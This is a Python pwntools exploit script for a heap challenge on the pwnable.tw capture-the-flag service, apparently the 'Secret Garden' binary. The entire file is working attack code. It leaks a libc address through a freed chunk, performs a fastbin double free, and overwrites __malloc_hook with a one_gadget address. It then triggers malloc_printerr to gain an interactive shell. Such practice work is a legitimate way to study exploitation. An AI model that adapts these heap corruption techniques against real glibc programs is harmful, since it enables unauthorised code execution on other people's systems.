import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './chal'
libc = ELF('./libc_64.so.6')

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn="chall.pwnable.tw 10203", pie_base=0x555555400000)
r.sym.update({
    'raise_flower': 0x0c32,
    'remove_flower': 0x0dd0,
    'visit_garden': 0x0f1d,
    'clean_garden': 0x0ea1,
})

def flow(size, name, color):
    r.sla(b'choice : ', b'1')
    r.sla(b'name :', str(size).encode())
    r.sla(b'flower :', name)
    r.sla(b'flower :', color)

def visit():
    r.sla(b'choice : ', b'2')

def remove(idx):
    r.sla(b'choice : ', b'3')
    r.sla(b'garden:', str(idx).encode())

def clean():
    r.sla(b'choice : ', b'4')


# libc leak
flow(0x100, b'aaaa', b'aaaa')
flow(4, b'top buffer', b'bbbb')
remove(0)
# r.gdb(r.call('raise_flower', 'malloc', 2))
flow(0xd0, b'a'*7, b'aaaa')
visit()

r.ru(b'flower[2] :')
r.rb(8)
leak = u64(r.rb(6) + b'\x00\x00')
log.info('Leak main arena: ' + hex(leak))
libc.address = leak - 0x3c3b78
log.info('Leak libc base: ' + hex(libc.address))

# double free
flow(0x60, b'aaaa', b'aaaa')
flow(0x60, b'bbbb', b'bbbb')
remove(3)
remove(4)
# r.gdb(r.call('remove_flower', 'free'))
remove(3)

# overwrite __malloc_hook with system
flow(0x60, p64(libc.symbols['__malloc_hook'] - 0x23), b'aaaa')
flow(0x60, b'bbbb', b'bbbb')
flow(0x60, b'cccc', b'cccc')

one_gadget = libc.address + 0xef6c4
pay = b'A' * (0x23-16)
pay += p64(one_gadget)
flow(0x60, pay, b'dddd')

# calling plain malloc didn't satisfy any of the constraints
# instead, attempt to trigger malloc_printerr
# which also triggers __malloc_hook
remove(8)

r.interactive()